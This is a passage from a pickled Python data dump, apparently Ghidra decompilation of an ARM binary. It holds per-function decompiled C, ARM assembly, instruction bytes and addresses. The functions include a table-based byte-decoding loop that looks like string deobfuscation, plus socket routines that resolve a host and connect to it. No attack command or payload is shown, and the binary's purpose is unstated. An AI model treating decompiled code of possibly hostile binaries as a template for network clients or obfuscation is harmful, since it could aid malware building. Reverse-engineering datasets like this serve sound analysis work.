r2,r0\ncpy r1,r5\ncpy r0,r4\nbl 0x000093b0\nldr r5,[0xa76c]\nmov r2,#0x200\nmov r1,#0x0\nadd r0,r5,#0x4\nldr r6,[r8,#0x0]\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\nmoveq r12,#0x0\nbeq 0x0000a3ac\nldr r4,[0xa750]\nldr r0,[r5,#0x0]\ncpy lr,r5\nmov r12,#0x0\nmov r1,#0x0\nldrb r3,[r1,r4]\nldrb r2,[r12,r0]\ncmp r2,r3\nldreq r3,[0xa754]\nldrbeq r2,[r1,r3]\nadd r1,r1,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r1,#0x41\nbne 0x0000a36c\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r12,r12,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r12\nadd lr,lr,#0x1\nbgt 0x0000a368\nadd r3,r12,r5\nmov r2,#0x0\nstrb r2,[r3,#0x4]\ncpy r0,r6\nldr r1,[0xa770]\nbl 0x000089e0\ncmp r0,#0x0\nbeq 0x0000a408\ncmp r9,#0x4\nldmneia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 pc }\nbl 0x00008a1c\nsubs r11,r0,#0x0\nbne 0x0000a608\nldr r0,[r8,#0x8]\nbl 0x00008a94\ncpy r5,r0\nldr r0,[r8,#0xc]\nbl 0x00008a94\nldr r4,[r8,#0x4]\ncpy r2,r0\ncpy r1,r5\ncpy r0,r4\nbl 0x00008e38\nldr r5,[0xa774]\nmov r2,#0x200\nmov r1,#0x0\nadd r0,r5,#0x4\nldr r6,[r8,#0x0]\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\nmoveq r0,#0x0\nbeq 0x0000a488\nldr r4,[0xa750]\nldr r12,[r5,#0x0]\ncpy lr,r5\nmov r0,#0x0\nmov r1,#0x0\nldrb r3,[r1,r4]\nldrb r2,[r12,r0]\ncmp r2,r3\nldreq r3,[0xa754]\nldrbeq r2,[r1,r3]\nadd r1,r1,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r1,#0x41\nbne 0x0000a448\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r0,r0,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r0\nadd lr,lr,#0x1\nbgt 0x0000a444\nadd r3,r0,r5\nmov r2,#0x0\nstrb r2,[r3,#0x4]\ncpy r0,r6\nldr r1,[0xa778]\nbl 0x000089e0\ncmp r0,#0x0\nldmeqia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 pc }\ncmp r9,#0x4\nldmneia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 pc }\nbl 0x00008a1c\nsubs r11,r0,#0x0\nbne 0x0000a6b0\nldr r0,[r8,#0x8]\nbl 0x00008a94\ncpy r4,r0\nldr r0,[r8,#0xc]\nbl 0x00008a94\nldr r5,[r8,#0x4]\ncpy r2,r0\ncpy r1,r4\ncpy r0,r5\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nb 0x00009204\nldr r5,[0xa77c]\nldmia r5,{ r3 r4 }\nmov r6,#0x1\nadds r3,r3,r6\nmov r7,#0x0\nadc r4,r4,r7\nmov r0,r3, lsl #0x2\nstmia r5,{ r3 r4 }\nadd r0,r0,#0x4\nbl 0x00008950\nldmia r5,{ r8 r9 }\ncpy r1,r8\ncpy r2,r9\nsubs r1,r1,r6\nsbc r2,r2,r7\norrs r3,r1,r2\ncpy r10,r0\nbeq 0x0000a744\nldr r5,[0xa780]\nmov r12,#0x0\nldr lr,[r5,#0x0]\ncpy r0,r12\nldr r3,[r0,lr]\nadd r12,r12,#0x1\ncmp r2,#0x0\nstr r3,[r0,r10]\nadd r0,r0,#0x4\ncpy r3,r12\nmov r4,#0x0\nbhi 0x0000a540\nbeq 0x0000a738\nmov r3,r8, lsl #0x2\nadd r3,r3,r10\nldr r0,[r5,#0x0]\nstr r11,[r3,#-0x4]\nbl 0x00008ac4\nstr r10,[r5,#0x0]\nldmia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 pc }\nldr r5,[0xa77c]\nldmia r5,{ r3 r4 }\nmov r6,#0x1\nadds r3,r3,r6\nmov r7,#0x0\nadc r4,r4,r7\nmov r0,r3, lsl #0x2\nstmia r5,{ r3 r4 }\nadd r0,r0,#0x4\nbl 0x00008950\nldmia r5,{ r8 r9 }\ncpy r1,r8\ncpy r2,r9\nsubs r1,r1,r6\nsbc r2,r2,r7\norrs r3,r1,r2\ncpy r10,r0\nbeq 0x0000a744\nldr r5,[0xa780]\nmov r12,#0x0\nldr lr,[r5,#0x0]\ncpy r0,r12\nldr r3,[r0,lr]\nadd r12,r12,#0x1\ncmp r2,#0x0\nstr r3,[r0,r10]\nadd r0,r0,#0x4\ncpy r3,r12\nmov r4,#0x0\nbhi 0x0000a5d8\nbne 0x0000a564\ncmp r1,r3\nbhi 0x0000a5d8\nb 0x0000a564\nldr r5,[0xa77c]\nldmia r5,{ r3 r4 }\nmov r6,#0x1\nadds r3,r3,r6\nmov r7,#0x0\nadc r4,r4,r7\nmov r0,r3, lsl #0x2\nstmia r5,{ r3 r4 }\nadd r0,r0,#0x4\nbl 0x00008950\nldmia r5,{ r8 r9 }\ncpy r1,r8\ncpy r2,r9\nsubs r1,r1,r6\nsbc r2,r2,r7\norrs r3,r1,r2\ncpy r10,r0\nbeq 0x0000a744\nldr r5,[0xa780]\nmov r12,#0x0\nldr lr,[r5,#0x0]\ncpy r0,r12\nldr r3,[r0,lr]\nadd r12,r12,#0x1\ncmp r2,#0x0\nstr r3,[r0,r10]\nadd r0,r0,#0x4\ncpy r3,r12\nmov r4,#0x0\nbhi 0x0000a660\nbne 0x0000a564\ncmp r1,r3\nbhi 0x0000a660\nb 0x0000a564\nldr r4,[0xa784]\nldr r0,[r4,#0x0]\nbl 0x00008ab8\nldr r0,[r4,#0x18]\nbl 0x00008ac4\ncpy r0,r5\nstr r5,[r4,#0x18]\nbl 0x00008a88\nldr r5,[0xa77c]\nldmia r5,{ r3 r4 }\nmov r6,#0x1\nadds r3,r3,r6\nmov r7,#0x0\nadc r4,r4,r7\nmov r0,r3, lsl #0x2\nstmia r5,{ r3 r4 }\nadd r0,r0,#0x4\nbl 0x00008950\nldmia r5,{ r8 r9 }\ncpy r1,r8\ncpy r2,r9\nsubs r1,r1,r6\nsbc r2,r2,r7\norrs r3,r1,r2\ncpy r10,r0\nbeq 0x0000a744\nldr r5,[0xa780]\nmov r12,#0x0\nldr lr,[r5,#0x0]\ncpy r0,r12\nldr r3,[r0,lr]\nadd r12,r12,#0x1\ncmp r2,#0x0\nstr r3,[r0,r10]\nadd r0,r0,#0x4\ncpy r3,r12\nmov r4,#0x0\nbhi 0x0000a708\nbne 0x0000a564\ncmp r1,r3\nbhi 0x0000a708\nb 0x0000a564\ncmp r1,r3\nbhi 0x0000a540\nb 0x0000a564\nldr r5,[0xa780]\nb 0x0000a564\n'
p144
S'f0 4f 2d e9\n84 56 9f e5\n01 80 a0 e1\n02 2c a0 e3\n00 90 a0 e1\n00 10 a0 e3\n04 00 85 e2\n00 60 98 e5\n57 fa ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n00 00 a0 03\n14 00 00 0a\n00 c0 95 e5\n50 46 9f e5\n05 e0 a0 e1\n00 00 a0 e3\n00 10 a0 e3\n04 30 d1 e7\n00 20 dc e7\n03 00 52 e1\n38 36 9f 05\n03 20 d1 07\n01 10 81 e2\n04 20 ce 05\n41 00 51 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 00 80 e2\n02 34 83 e1\n00 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 30 80 e0\n00 50 a0 e3\n06 00 a0 e1\n04 50 c3 e5\nf8 15 9f e5\n1f fa ff eb\n00 60 50 e2\n49 01 00 1a\nec 55 9f e5\n02 2c a0 e3\n06 10 a0 e1\n04 00 85 e2\n00 a0 98 e5\n2f fa ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n06 00 a0 01\n14 00 00 0a\nb4 45 9f e5\n00 e0 95 e5\n06 00 a0 e1\n05 10 a0 e1\n00 c0 a0 e3\n04 30 dc e7\n0e 20 d0 e7\n03 00 52 e1\n98 35 9f 05\n03 20 dc 07\n01 c0 8c e2\n04 20 c1 05\n41 00 5c e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 00 80 e2\n02 34 83 e1\n00 00 53 e1\n01 10 81 e2\nee ff ff ca\n05 30 80 e0\n00 20 a0 e3\n04 20 c3 e5\n0a 00 a0 e1\n60 15 9f e5\nf7 f9 ff eb\n00 00 50 e3\n11 00 00 0a\n05 00 59 e3\nf0 8f bd 18\n01 fa ff eb\n00 b0 50 e2\nb2 00 00 1a\n08 00 98 e5\n1b fa ff eb\n00 48 a0 e1\n10 00 98 e5\n18 fa ff eb\n04 50 98 e5\n0c 60 98 e5\n24 48 a0 e1\n00 30 a0 e1\n04 10 a0 e1\n05 00 a0 e1\n06 20 a0 e1\n33 fe ff eb\n0c 55 9f e5\n02 2c a0 e3\n00 10 a0 e3\n04 00 85 e2\n00 60 98 e5\nf5 f9 ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n00 c0 a0 03\n14 00 00 0a\ncc 44 9f e5\n00 00 95 e5\n05 e0 a0 e1\n00 c0 a0 e3\n00 10 a0 e3\n04 30 d1 e7\n00 20 dc e7\n03 00 52 e1\nb0 34 9f 05\n03 20 d1 07\n01 10 81 e2\n04 20 ce 05\n41 00 51 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 c0 8c e2\n02 34 83 e1\n0c 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 30 8c e0\n00 20 a0 e3\n04 20 c3 e5\n06 00 a0 e1\n80 14 9f e5\nbd f9 ff eb\n00 00 50 e3\n0e 00 00 0a\n04 00 59 e3\nf0 8f bd 18\nc7 f9 ff eb\n00 b0 50 e2\n9e 00 00 1a\n08 00 98 e5\ne1 f9 ff eb\n00 50 a0 e1\n0c 00 98 e5\nde f9 ff eb\n04 40 98 e5\n00 20 a0 e1\n05 10 a0 e1\n04 00 a0 e1\n20 fc ff eb\n38 54 9f e5\n02 2c a0 e3\n00 10 a0 e3\n04 00 85 e2\n00 60 98 e5\nbe f9 ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n00 c0 a0 03\n14 00 00 0a\nf0 43 9f e5\n00 00 95 e5\n05 e0 a0 e1\n00 c0 a0 e3\n00 10 a0 e3\n04 30 d1 e7\n00 20 dc e7\n03 00 52 e1\nd4 33 9f 05\n03 20 d1 07\n01 10 81 e2\n04 20 ce 05\n41 00 51 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 c0 8c e2\n02 34 83 e1\n0c 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 30 8c e0\n00 20 a0 e3\n04 20 c3 e5\n06 00 a0 e1\nac 13 9f e5\n86 f9 ff eb\n00 00 50 e3\n0e 00 00 0a\n04 00 59 e3\nf0 8f bd 18\n90 f9 ff eb\n00 b0 50 e2\n89 00 00 1a\n08 00 98 e5\naa f9 ff eb\n00 50 a0 e1\n0c 00 98 e5\na7 f9 ff eb\n04 40 98 e5\n00 20 a0 e1\n05 10 a0 e1\n04 00 a0 e1\n8b fa ff eb\n64 53 9f e5\n02 2c a0 e3\n00 10 a0 e3\n04 00 85 e2\n00 60 98 e5\n87 f9 ff eb\n04 22 d5 e5\n05 32 d5 e5\n03 34 92 e1\n00 00 a0 03\n14 00 00 0a\n14 43 9f e5\n00 c0 95 e5\n05 e0 a0 e1\n00 00 a0 e3\n00 10 a0 e3\n04 30 d1 e7\n00 20 dc e7\n03 00 52 e1\nf8 32 9f 05\n03 20 d1 07\n01 10 81 e2\n04 20 ce 05\n41 00 51 e3\nf6 ff ff 1a\n04 32 d5 e5\n05 22 d5 e5\n01 00 80 e2\n02 34 83 e1\n00 00 53 e1\n01 e0 8e e2\nee ff ff ca\n05 30 80 e0\n00 20 a0 e3\n04 20 c3 e5\n06 00 a0 e1\nd8 12 9f e5\n4f f9 ff eb\n00 00 50 e3\nf0 8f bd 08\n04 00 59 e3\nf0 8f bd 18\n59 f9 ff eb\n00 b0 50 e2\n7c 00 00 1a\n08 00 98 e5\n73 f9 ff eb\n00 40 a0 e1\n0c 00 98 e5\n70 f9 ff eb\n04 50 98 e5\n00 20 a0 e1\n04 10 a0 e1\n05 00 a0 e1\nf0 4f bd e8\n46 fb ff ea\n8c 52 9f e5\n18 00 95 e8\n01 60 a0 e3\n06 30 93 e0\n00 70 a0 e3\n07 40 a4 e0\n03 01 a0 e1\n18 00 85 e8\n04 00 80 e2\n0f f9 ff eb\n00 03 95 e8\n08 10 a0 e1\n09 20 a0 e1\n06 10 51 e0\n07 20 c2 e0\n02 30 91 e1\n00 a0 a0 e1\n84 00 00 0a\n48 52 9f e5\n00 c0 a0 e3\n00 e0 95 e5\n0c 00 a0 e1\n0e 30 90 e7\n01 c0 8c e2\n00 00 52 e3\n0a 30 80 e7\n04 00 80 e2\n0c 30 a0 e1\n00 40 a0 e3\nf7 ff ff 8a\n74 00 00 0a\n08 31 a0 e1\n0a 30 83 e0\n00 00 95 e5\n04 b0 03 e5\n52 f9 ff eb\n00 a0 85 e5\nf0 8f bd e8\nf4 51 9f e5\n18 00 95 e8\n01 60 a0 e3\n06 30 93 e0\n00 70 a0 e3\n07 40 a4 e0\n03 01 a0 e1\n18 00 85 e8\n04 00 80 e2\ne9 f8 ff eb\n00 03 95 e8\n08 10 a0 e1\n09 20 a0 e1\n06 10 51 e0\n07 20 c2 e0\n02 30 91 e1\n00 a0 a0 e1\n5e 00 00 0a\nb0 51 9f e5\n00 c0 a0 e3\n00 e0 95 e5\n0c 00 a0 e1\n0e 30 90 e7\n01 c0 8c e2\n00 00 52 e3\n0a 30 80 e7\n04 00 80 e2\n0c 30 a0 e1\n00 40 a0 e3\nf7 ff ff 8a\nd9 ff ff 1a\n03 00 51 e1\nf4 ff ff 8a\nd6 ff ff ea\n6c 51 9f e5\n18 00 95 e8\n01 60 a0 e3\n06 30 93 e0\n00 70 a0 e3\n07 40 a4 e0\n03 01 a0 e1\n18 00 85 e8\n04 00 80 e2\nc7 f8 ff eb\n00 03 95 e8\n08 10 a0 e1\n09 20 a0 e1\n06 10 51 e0\n07 20 c2 e0\n02 30 91 e1\n00 a0 a0 e1\n3c 00 00 0a\n28 51 9f e5\n00 c0 a0 e3\n00 e0 95 e5\n0c 00 a0 e1\n0e 30 90 e7\n01 c0 8c e2\n00 00 52 e3\n0a 30 80 e7\n04 00 80 e2\n0c 30 a0 e1\n00 40 a0 e3\nf7 ff ff 8a\nb7 ff ff 1a\n03 00 51 e1\nf4 ff ff 8a\nb4 ff ff ea\nec 40 9f e5\n00 00 94 e5\n06 f9 ff eb\n18 00 94 e5\n07 f9 ff eb\n05 00 a0 e1\n18 50 84 e5\nf5 f8 ff eb\nc4 50 9f e5\n18 00 95 e8\n01 60 a0 e3\n06 30 93 e0\n00 70 a0 e3\n07 40 a4 e0\n03 01 a0 e1\n18 00 85 e8\n04 00 80 e2\n9d f8 ff eb\n00 03 95 e8\n08 10 a0 e1\n09 20 a0 e1\n06 10 51 e0\n07 20 c2 e0\n02 30 91 e1\n00 a0 a0 e1\n12 00 00 0a\n80 50 9f e5\n00 c0 a0 e3\n00 e0 95 e5\n0c 00 a0 e1\n0e 30 90 e7\n01 c0 8c e2\n00 00 52 e3\n0a 30 80 e7\n04 00 80 e2\n0c 30 a0 e1\n00 40 a0 e3\nf7 ff ff 8a\n8d ff ff 1a\n03 00 51 e1\nf4 ff ff 8a\n8a ff ff ea\n03 00 51 e1\n7f ff ff 8a\n87 ff ff ea\n34 50 9f e5\n85 ff ff ea\n'
p145
S'.text:0000a0bc\n.text:0000a0c0\n.text:0000a0c4\n.text:0000a0c8\n.text:0000a0cc\n.text:0000a0d0\n.text:0000a0d4\n.text:0000a0d8\n.text:0000a0dc\n.text:0000a0e0\n.text:0000a0e4\n.text:0000a0e8\n.text:0000a0ec\n.text:0000a0f0\n.text:0000a0f4\n.text:0000a0f8\n.text:0000a0fc\n.text:0000a100\n.text:0000a104\n.text:0000a108\n.text:0000a10c\n.text:0000a110\n.text:0000a114\n.text:0000a118\n.text:0000a11c\n.text:0000a120\n.text:0000a124\n.text:0000a128\n.text:0000a12c\n.text:0000a130\n.text:0000a134\n.text:0000a138\n.text:0000a13c\n.text:0000a140\n.text:0000a144\n.text:0000a148\n.text:0000a14c\n.text:0000a150\n.text:0000a154\n.text:0000a158\n.text:0000a15c\n.text:0000a160\n.text:0000a164\n.text:0000a168\n.text:0000a16c\n.text:0000a170\n.text:0000a174\n.text:0000a178\n.text:0000a17c\n.text:0000a180\n.text:0000a184\n.text:0000a188\n.text:0000a18c\n.text:0000a190\n.text:0000a194\n.text:0000a198\n.text:0000a19c\n.text:0000a1a0\n.text:0000a1a4\n.text:0000a1a8\n.text:0000a1ac\n.text:0000a1b0\n.text:0000a1b4\n.text:0000a1b8\n.text:0000a1bc\n.text:0000a1c0\n.text:0000a1c4\n.text:0000a1c8\n.text:0000a1cc\n.text:0000a1d0\n.text:0000a1d4\n.text:0000a1d8\n.text:0000a1dc\n.text:0000a1e0\n.text:0000a1e4\n.text:0000a1e8\n.text:0000a1ec\n.text:0000a1f0\n.text:0000a1f4\n.text:0000a1f8\n.text:0000a1fc\n.text:0000a200\n.text:0000a204\n.text:0000a208\n.text:0000a20c\n.text:0000a210\n.text:0000a214\n.text:0000a218\n.text:0000a21c\n.text:0000a220\n.text:0000a224\n.text:0000a228\n.text:0000a22c\n.text:0000a230\n.text:0000a234\n.text:0000a238\n.text:0000a23c\n.text:0000a240\n.text:0000a244\n.text:0000a248\n.text:0000a24c\n.text:0000a250\n.text:0000a254\n.text:0000a258\n.text:0000a25c\n.text:0000a260\n.text:0000a264\n.text:0000a268\n.text:0000a26c\n.text:0000a270\n.text:0000a274\n.text:0000a278\n.text:0000a27c\n.text:0000a280\n.text:0000a284\n.text:0000a288\n.text:0000a28c\n.text:0000a290\n.text:0000a294\n.text:0000a298\n.text:0000a29c\n.text:0000a2a0\n.text:0000a2a4\n.text:0000a2a8\n.text:0000a2ac\n.text:0000a2b0\n.text:0000a2b4\n.text:0000a2b8\n.text:0000a2bc\n.text:0000a2c0\n.text:0000a2c4\n.text:0000a2c8\n.text:0000a2cc\n.text:0000a2d0\n.text:0000a2d4\n.text:0000a2d8\n.text:0000a2dc\n.text:0000a2e0\n.text:0000a2e4\n.text:0000a2e8\n.text:0000a2ec\n.text:0000a2f0\n.text:0000a2f4\n.text:0000a2f8\n.text:0000a2fc\n.text:0000a300\n.text:0000a304\n.text:0000a308\n.text:0000a30c\n.text:0000a310\n.text:0000a314\n.text:0000a318\n.text:0000a31c\n.text:0000a320\n.text:0000a324\n.text:0000a328\n.text:0000a32c\n.text:0000a330\n.text:0000a334\n.text:0000a338\n.text:0000a33c\n.text:0000a340\n.text:0000a344\n.text:0000a348\n.text:0000a34c\n.text:0000a350\n.text:0000a354\n.text:0000a358\n.text:0000a35c\n.text:0000a360\n.text:0000a364\n.text:0000a368\n.text:0000a36c\n.text:0000a370\n.text:0000a374\n.text:0000a378\n.text:0000a37c\n.text:0000a380\n.text:0000a384\n.text:0000a388\n.text:0000a38c\n.text:0000a390\n.text:0000a394\n.text:0000a398\n.text:0000a39c\n.text:0000a3a0\n.text:0000a3a4\n.text:0000a3a8\n.text:0000a3ac\n.text:0000a3b0\n.text:0000a3b4\n.text:0000a3b8\n.text:0000a3bc\n.text:0000a3c0\n.text:0000a3c4\n.text:0000a3c8\n.text:0000a3cc\n.text:0000a3d0\n.text:0000a3d4\n.text:0000a3d8\n.text:0000a3dc\n.text:0000a3e0\n.text:0000a3e4\n.text:0000a3e8\n.text:0000a3ec\n.text:0000a3f0\n.text:0000a3f4\n.text:0000a3f8\n.text:0000a3fc\n.text:0000a400\n.text:0000a404\n.text:0000a408\n.text:0000a40c\n.text:0000a410\n.text:0000a414\n.text:0000a418\n.text:0000a41c\n.text:0000a420\n.text:0000a424\n.text:0000a428\n.text:0000a42c\n.text:0000a430\n.text:0000a434\n.text:0000a438\n.text:0000a43c\n.text:0000a440\n.text:0000a444\n.text:0000a448\n.text:0000a44c\n.text:0000a450\n.text:0000a454\n.text:0000a458\n.text:0000a45c\n.text:0000a460\n.text:0000a464\n.text:0000a468\n.text:0000a46c\n.text:0000a470\n.text:0000a474\n.text:0000a478\n.text:0000a47c\n.text:0000a480\n.text:0000a484\n.text:0000a488\n.text:0000a48c\n.text:0000a490\n.text:0000a494\n.text:0000a498\n.text:0000a49c\n.text:0000a4a0\n.text:0000a4a4\n.text:0000a4a8\n.text:0000a4ac\n.text:0000a4b0\n.text:0000a4b4\n.text:0000a4b8\n.text:0000a4bc\n.text:0000a4c0\n.text:0000a4c4\n.text:0000a4c8\n.text:0000a4cc\n.text:0000a4d0\n.text:0000a4d4\n.text:0000a4d8\n.text:0000a4dc\n.text:0000a4e0\n.text:0000a4e4\n.text:0000a4e8\n.text:0000a4ec\n.text:0000a4f0\n.text:0000a4f4\n.text:0000a4f8\n.text:0000a4fc\n.text:0000a500\n.text:0000a504\n.text:0000a508\n.text:0000a50c\n.text:0000a510\n.text:0000a514\n.text:0000a518\n.text:0000a51c\n.text:0000a520\n.text:0000a524\n.text:0000a528\n.text:0000a52c\n.text:0000a530\n.text:0000a534\n.text:0000a538\n.text:0000a53c\n.text:0000a540\n.text:0000a544\n.text:0000a548\n.text:0000a54c\n.text:0000a550\n.text:0000a554\n.text:0000a558\n.text:0000a55c\n.text:0000a560\n.text:0000a564\n.text:0000a568\n.text:0000a56c\n.text:0000a570\n.text:0000a574\n.text:0000a578\n.text:0000a57c\n.text:0000a580\n.text:0000a584\n.text:0000a588\n.text:0000a58c\n.text:0000a590\n.text:0000a594\n.text:0000a598\n.text:0000a59c\n.text:0000a5a0\n.text:0000a5a4\n.text:0000a5a8\n.text:0000a5ac\n.text:0000a5b0\n.text:0000a5b4\n.text:0000a5b8\n.text:0000a5bc\n.text:0000a5c0\n.text:0000a5c4\n.text:0000a5c8\n.text:0000a5cc\n.text:0000a5d0\n.text:0000a5d4\n.text:0000a5d8\n.text:0000a5dc\n.text:0000a5e0\n.text:0000a5e4\n.text:0000a5e8\n.text:0000a5ec\n.text:0000a5f0\n.text:0000a5f4\n.text:0000a5f8\n.text:0000a5fc\n.text:0000a600\n.text:0000a604\n.text:0000a608\n.text:0000a60c\n.text:0000a610\n.text:0000a614\n.text:0000a618\n.text:0000a61c\n.text:0000a620\n.text:0000a624\n.text:0000a628\n.text:0000a62c\n.text:0000a630\n.text:0000a634\n.text:0000a638\n.text:0000a63c\n.text:0000a640\n.text:0000a644\n.text:0000a648\n.text:0000a64c\n.text:0000a650\n.text:0000a654\n.text:0000a658\n.text:0000a65c\n.text:0000a660\n.text:0000a664\n.text:0000a668\n.text:0000a66c\n.text:0000a670\n.text:0000a674\n.text:0000a678\n.text:0000a67c\n.text:0000a680\n.text:0000a684\n.text:0000a688\n.text:0000a68c\n.text:0000a690\n.text:0000a694\n.text:0000a698\n.text:0000a69c\n.text:0000a6a0\n.text:0000a6a4\n.text:0000a6a8\n.text:0000a6ac\n.text:0000a6b0\n.text:0000a6b4\n.text:0000a6b8\n.text:0000a6bc\n.text:0000a6c0\n.text:0000a6c4\n.text:0000a6c8\n.text:0000a6cc\n.text:0000a6d0\n.text:0000a6d4\n.text:0000a6d8\n.text:0000a6dc\n.text:0000a6e0\n.text:0000a6e4\n.text:0000a6e8\n.text:0000a6ec\n.text:0000a6f0\n.text:0000a6f4\n.text:0000a6f8\n.text:0000a6fc\n.text:0000a700\n.text:0000a704\n.text:0000a708\n.text:0000a70c\n.text:0000a710\n.text:0000a714\n.text:0000a718\n.text:0000a71c\n.text:0000a720\n.text:0000a724\n.text:0000a728\n.text:0000a72c\n.text:0000a730\n.text:0000a734\n.text:0000a738\n.text:0000a73c\n.text:0000a740\n.text:0000a744\n.text:0000a748\n'
p146
tp147
sS'send'
p148
(S'\n__stdcall send(int __fd, void * __buf, size_t __n, int __flags)\n'
p149
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t send(int __fd,void *__buf,size_t __n,int __flags)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008988. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_000132fc)();\u000a  return sVar1;\u000a}\u000a\u000a
p150
S'adr r12,0x8988\nadd r12,r12,#0xa000\nldr pc,[r12,#0x974]!\n'
p151
S'00 c6 8f e2\n0a ca 8c e2\n74 f9 bc e5\n'
p152
S'.plt:00008980\n.plt:00008984\n.plt:00008988\n'
p153
tp154
sS'inet_addr'
p155
(S'\n__stdcall inet_addr(char * __cp)\n'
p156
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000ain_addr_t inet_addr(char *__cp)\u000a\u000a{\u000a  in_addr_t iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089c4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00013310)();\u000a  return iVar1;\u000a}\u000a\u000a
p157
S'adr r12,0x89c4\nadd r12,r12,#0xa000\nldr pc,[r12,#0x94c]!\n'
p158
S'00 c6 8f e2\n0a ca 8c e2\n4c f9 bc e5\n'
p159
S'.plt:000089bc\n.plt:000089c0\n.plt:000089c4\n'
p160
tp161
sS'FUN_00008d78'
p162
(S'\n__stdcall FUN_00008d78()\n'
p163
V\u000aint FUN_00008d78(char *pcParm1,int iParm2)\u000a\u000a{\u000a  hostent *phVar1;\u000a  int __fd;\u000a  int iVar2;\u000a  undefined local_24;\u000a  undefined local_23;\u000a  char local_22;\u000a  char local_21;\u000a  undefined auStack32 [12];\u000a  undefined4 local_14;\u000a  \u000a  local_14 = 1;\u000a  phVar1 = gethostbyname(pcParm1);\u000a  if (phVar1 != (hostent *)0x0) {\u000a    bcopy(*phVar1->h_addr_list,auStack32,phVar1->h_length);\u000a    local_21 = (char)iParm2;\u000a    local_23 = 0;\u000a    local_22 = (char)((uint)(iParm2 << 0x10) >> 0x18);\u000a    local_24 = 2;\u000a    __fd = socket(2,1,6);\u000a    setsockopt(__fd,6,1,&local_14,4);\u000a    if ((__fd != -1) && (iVar2 = connect(__fd,(sockaddr *)&local_24,0x10), iVar2 != -1)) {\u000a      return __fd;\u000a    }\u000a  }\u000a  return 0;\u000a}\u000a\u000a
p164
S'stmdb sp!,{ r4 r5 r6 lr }\nmov r6,#0x1\nsub sp,sp,#0x18\nmov r5,r1, lsl #0x10\nstr r6,[sp,#0x14]\nbl 0x00008a64\ncmp r0,#0x0\nadd r1,sp,#0x8\nmov r4,r5, lsr #0x10\nbeq 0x00008e30\nadd r2,r0,#0xc\nldmia r2,{ r2 r3 }\nldr r0,[r3,#0x0]\nbl 0x00008a04\nand r12,r4,#0xff\nmov r12,r12, lsl #0x8\norr r12,r12,r5, lsr #0x18\nmov r4,#0x2\nmov lr,r12, asr #0x8\nmov r3,#0x0\ncpy r0,r4\ncpy r1,r6\nmov r2,#0x6\nstrb lr,[sp,#0x7]\nstrb r3,[sp,#0x5]\nstrb r12,[sp,#0x6]\nstrb r4,[sp,#0x4]\nbl 0x00008968\ncpy r2,r6\ncpy r4,r0\nmov r1,#0x6\nmov r12,#0x4\nadd r3,sp,#0x14\nstr r12,[sp,#0x0]\nbl 0x000089d4\ncmn r4,#0x1\ncpy r0,r4\nmov r2,#0x10\nadd r1,sp,#0x4\nbeq 0x00008e30\nbl 0x0000892c\ncmn r0,#0x1\nbeq 0x00008e30\ncpy r0,r4\nadd sp,sp,#0x18\nldmia sp!,{ r4 r5 r6 pc }\nmov r4,#0x0\nb 0x00008e24\n'
p165
S'70 40 2d e9\n01 60 a0 e3\n18 d0 4d e2\n01 58 a0 e1\n14 60 8d e5\n34 ff ff eb\n00 00 50 e3\n08 10 8d e2\n25 48 a0 e1\n23 00 00 0a\n0c 20 80 e2\n0c 00 92 e8\n00 00 93 e5\n14 ff ff eb\nff c0 04 e2\n0c c4 a0 e1\n25 cc 8c e1\n02 40 a0 e3\n4c e4 a0 e1\n00 30 a0 e3\n04 00 a0 e1\n06 10 a0 e1\n06 20 a0 e3\n07 e0 cd e5\n05 30 cd e5\n06 c0 cd e5\n04 40 cd e5\ndf fe ff eb\n06 20 a0 e1\n00 40 a0 e1\n06 10 a0 e3\n04 c0 a0 e3\n14 30 8d e2\n00 c0 8d e5\nf3 fe ff eb\n01 00 74 e3\n04 00 a0 e1\n10 20 a0 e3\n04 10 8d e2\n05 00 00 0a\nc3 fe ff eb\n01 00 70 e3\n02 00 00 0a\n04 00 a0 e1\n18 d0 8d e2\n70 80 bd e8\n00 40 a0 e3\nfa ff ff ea\n'
p166
